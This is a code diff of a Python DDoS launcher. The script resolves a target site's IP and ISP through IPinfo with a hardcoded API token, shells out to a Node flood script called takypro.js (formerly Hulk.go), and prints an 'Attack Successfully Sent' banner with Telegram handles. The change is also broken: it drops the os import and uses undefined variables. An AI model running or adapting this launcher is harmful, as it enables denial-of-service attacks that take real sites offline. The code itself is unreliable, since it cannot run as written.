@@ -2,7 +2,6 @@ import argparse
 from datetime import datetime
 import socket
 import ipinfo
-import os
 
 # Token API dari IPinfo
 access_token = '40e69d29bf68ac'  # Ganti dengan token IPinfo Anda
@@ -36,7 +35,7 @@ def get_isp(ip_address):
     except Exception as e:
         return f"Error: {e}"
 
-def main(url, duration):
+def main(url, threads, time, methods):
     current_time = datetime.now().strftime('%Y-%m-%d %H:%M')
 
     # Bersihkan URL dari http:// atau https://
@@ -52,27 +51,25 @@ def main(url, duration):
         isp_info = "Unable to retrieve ISP information"
 
     print(f"   Target Details :")
-    print(f"        STATUS  : [ Attack Successfully Sent By iRazzGans ]")
-    print(f"        TARGET  : [ {url} ]")
-    print(f"        IP      : [ {ip_address} ]")
-    print(f"        ISP     : [ {isp_info} ]")
-    print(f"        THREADS : [ NO THREAD ]")
-    print(f"        TIME    : [ {duration if duration else 'INFINITY'} ]")
-    print(f"        METHOD  : [ KILL ]")
+    print(f"        \x1b[38;2;233;233;233mSTATUS  : [ \x1b[38;2;0;212;14mAttack Successfully Sent By Actrotophiles \x1b[38;2;233;233;233m]")
+    print(f"        \x1b[38;2;233;233;233mTARGET  : [ \x1b[38;2;0;255;255m{host} \x1b[38;2;233;233;233m]")
+    print(f"        \x1b[38;2;233;233;233mIP      : [ \x1b[38;2;0;255;255m{ip_address} \x1b[38;2;233;233;233m]")
+    print(f"        \x1b[38;2;233;233;233mISP     : [ \x1b[38;2;0;255;255m{isp_info} \x1b[38;2;233;233;233m]")
+    print(f"        \x1b[38;2;233;233;233mTHREADS : [ \x1b[38;2;0;255;255mNO THREADS \x1b[38;2;233;233;233m]")
+    print(f"        \x1b[38;2;233;233;233mTIME    : [ \x1b[38;2;0;255;255m{time} \x1b[38;2;233;233;233m]")
+    print(f"        \x1b[38;2;233;233;233mMETHOD  : [ \x1b[38;2;0;255;255mRAZ \x1b[38;2;233;233;233m]")
     print(f"   Attack Details :")
-    print(f"        STATUS : [ Attack With 1 Conc ]")
-    print(f"        HOUR   : [ {current_time} ]")
-    print(f"        TELE   : [ t.me/iRazzGans ]")
-    print(f"   Attack Was Successful And Has Been Completed")
+    print(f"        \x1b[38;2;233;233;233mSTATUS : [ \x1b[38;2;0;212;14mAttack With 1 Conc \x1b[38;2;233;233;233m]")
+    print(f"        \x1b[38;2;233;233;233mHOUR   : [ \x1b[38;2;0;255;255m{current_time} \x1b[38;2;233;233;233m]")
+    print(f"        \x1b[38;2;233;233;233mTELE   : [ \x1b[38;2;0;255;255mt.me/neverdowns \x1b[38;2;233;233;233m]")
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Simulate an attack command.')
-    parser.add_argument('url', type=str, help='URL to attack')
-    parser.add_argument('methods', type=str, help='metod')
-    parser.add_argument('duration', type=int, default=0, help='Duration to run the attack in seconds')
+    parser.add_argument('host', type=str, help='URL to attack')
+    parser.add_argument('time', type=int, help='Time duration of attack')
 
     args = parser.parse_args()
 
-    # Call the Go script with the correct URL and duration
-    os.system(f'go run Hulk.go -site {args.url} -data {args.methods} -time {args.time}')
-    main(args.url, args.duration)
+    os.system(f'node takypro.js {host} {time} 5000 5000')
+
+    main(args.host, args.time)
